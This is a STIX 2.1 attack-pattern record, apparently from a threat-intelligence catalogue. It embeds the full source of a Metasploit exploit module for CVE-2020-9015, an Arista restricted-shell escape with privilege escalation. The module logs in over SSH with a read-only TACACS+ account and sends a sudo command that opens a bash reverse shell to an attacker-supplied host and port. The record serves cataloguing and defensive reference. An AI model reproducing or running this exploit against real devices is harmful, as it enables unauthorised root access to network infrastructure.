{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2fe868c-56fa-4ad4-9e5f-4a941e1105b2",
    "created": "2024-08-14T17:14:21.464771Z",
    "modified": "2024-08-14T17:14:21.464774Z",
    "name": "Arista restricted shell escape (with privesc)",
    "description": " This exploit module takes advantage of a poorly configured TACACS+ config Arista's bash shell and TACACS+ read-only account to privilage escalate. A CVSS v3 base score of 9.8 has been assigned.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/ssh/arista_tacplus_shell.rb",
            "external_id": "arista_tacplus_shell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-9015"
        },
        {
            "source_name": "reference",
            "url": "http://www.securitybytes.me/posts/cve-2020-9015/"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9015"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SSH\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Arista restricted shell escape (with privesc)',\n        'Description' => %q{\n          This exploit module takes advantage of a poorly configured TACACS+ config,\n          Arista's bash shell and TACACS+ read-only account to privilage escalate.\n          A CVSS v3 base score of 9.8 has been assigned.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Chris Anders'],\n        'References' => [\n          [ 'CVE', '2020-9015'],\n          [ 'URL', 'http://www.securitybytes.me/posts/cve-2020-9015/'],\n          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-9015' ],\n        ],\n        'Arch' => ARCH_X86,\n        'ConnectionType' => 'find',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'Payload' => 'linux/x86/shell_reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2020-02-02',\n        'Platform' => 'linux',\n        'PayloadType' => 'cmd_interact',\n        'Privileged' => true,\n        'Targets' => [ [ 'Universal', {} ] ]\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [true, 'Username to login with', '']),\n        OptString.new('PASSWORD', [true, 'Password to login with', '']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        Opt::Proxies,\n        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),\n        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', false])\n      ]\n    )\n  end\n\n  def check\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      password: password\n    })\n\n    begin\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(rhost, username, opts)\n      end\n    rescue Rex::ConnectionError\n      return CheckCode::Safe\n    rescue Net::SSH::Disconnect, ::EOFError\n      return CheckCode::Safe\n    rescue Timeout::Error\n      return CheckCode::Safe\n    rescue Net::SSH::AuthenticationFailed\n      return CheckCode::Safe\n    rescue Net::SSH::Exception\n      return CheckCode::Safe\n    end\n\n    CheckCode::Detected\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def lport\n    datastore['LPORT']\n  end\n\n  def lhost\n    datastore['LHOST']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def exploit\n    factory = ssh_socket_factory\n\n    opts = {\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      use_agent: false,\n      config: false,\n      password: password,\n      proxy: factory,\n      non_interactive: true,\n      verify_host_key: :never\n    }\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    print_status(\"#{rhost}:#{rport} - Attempt to login to the Arista's restricted shell...\")\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, username, opts)\n      end\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} SSH - Connection error or address in use\")\n    rescue Net::SSH::Disconnect, ::EOFError\n      fail_with(Failure::Disconnected, \"#{rhost}:#{rport} SSH - Disconnected during negotiation\")\n    rescue ::Timeout::Error\n      fail_with(Failure::TimeoutExpired, \"#{rhost}:#{rport} SSH - Timed out during negotiation\")\n    rescue Net::SSH::AuthenticationFailed\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} SSH - Failed authentication\")\n    rescue Net::SSH::Exception => e\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\")\n    end\n\n    fail_with(Failure::Unknown, \"#{rhost}:#{rport} SSH session couldn't be established\") unless ssh\n    begin\n      payload_executed = false\n      print_good('SSH connection established.')\n\n      ssh.open_channel do |channel, _data|\n        print_status('Requesting pty rbash')\n\n        channel.request_pty do |ch, success|\n          fail_with(Failure::Unreachable, \"#{rhost}:#{rport} Could not request a PTY!\") unless success\n          print_good('PTY successfully obtained.')\n\n          print_status('Requesting a shell.')\n          ch.send_channel_request('shell') do |cha, _succ|\n            fail_with(Failure::Unreachable, \"#{rhost}:#{rport} Could not open rbash shell!\") unless success\n            print_good('Spawned into arista rbash shell.')\n\n            cha.on_data do |_xx, data2|\n              if data2.include?('#') && !payload_executed\n                print_status('Attempting to break out of Arista rbash...')\n                channel.send_data(\"show run | grep '' | sudo bash -c 'bash -i >& /dev/tcp/#{lhost}/#{lport} 0>&1 2>&1 &'\\n\")\n                payload_executed = true\n                print_good('Escaped from rbash!')\n              end\n            end\n          end\n        end\n      end\n      ssh.loop unless session_created?\n    rescue Errno::EBADF => e\n      elog(e.message)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}